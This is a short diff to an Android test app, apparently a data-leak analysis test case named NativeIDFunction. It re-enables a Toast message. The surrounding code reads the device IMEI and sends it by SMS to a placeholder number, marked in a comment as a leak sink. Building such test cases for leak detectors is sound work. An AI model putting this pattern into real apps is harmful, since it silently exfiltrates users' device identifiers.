@@ -9,7 +9,7 @@ import android.telephony.TelephonyManager;
 import android.view.View;
 import android.view.View.OnClickListener;
 import android.widget.Button;
-//import android.widget.Toast;
+import android.widget.Toast;
 
 /**
  * @testcase_name NativeIDFunction
@@ -52,7 +52,7 @@ public class ActMain extends Activity {
 				strOut += "\n- cFuncRetString(...):["+cFuncRetString(strIMEI)+"]";
 				strOut += "\n- cFuncModString(...):["+cFuncModString(strIMEI)+"]";
 
-				//Toast.makeText(ActMain.this, strOut, Toast.LENGTH_LONG).show();
+				Toast.makeText(ActMain.this, strOut, Toast.LENGTH_LONG).show();
 				
 				SmsManager sms = SmsManager.getDefault();
 		        sms.sendTextMessage("+49 1234", null, strOut, null, null);  //sink, leak 
